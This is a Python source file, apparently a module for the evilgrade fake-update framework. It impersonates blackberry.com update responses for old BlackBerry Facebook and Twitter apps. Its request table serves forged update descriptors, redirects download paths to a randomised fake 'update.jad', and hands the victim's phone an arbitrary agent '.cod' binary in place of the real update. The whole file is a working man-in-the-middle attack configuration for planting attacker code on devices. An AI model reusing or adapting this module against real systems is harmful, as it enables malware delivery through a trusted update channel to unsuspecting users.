from modules import ModuleBase


class Blackberry(ModuleBase):
    name = 'Blackberry'
    version = '1.0'
    appver = '< Facebook 1.7.0.22 | Twitter 1.0.0.45'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/EkopartyWebIcon.cod'
    enabled = False
    #rcp.na.blackberry.com
    vh = '(www.blackberry.com)' 
    requests = [
        {   'path': '/facebook.update',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/blackberry/facebook.update',
        },
        {   'path': '/net_rim_bb_twitter.jad',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/blackberry/twitter.update',
        },

        {   'path': '(/facebook/|/twitterdownload)',    #regex anything
            'type': 'redirect',
            'location': 'http://www.blackberry.com/<%RND1%>update.jad',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': ''
        },
        {   'path': 'update.jad',
            'type': 'string',
            'headers': {'Content-type': 'text/vnd.sun.j2me.app-descriptor'},
            'method': '',
            'bin': '',
            'string': '',
            'parse': 0,
            'file': './agent/EkopartyWebIcon.jad',
        },
        {   'path': '.cod',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
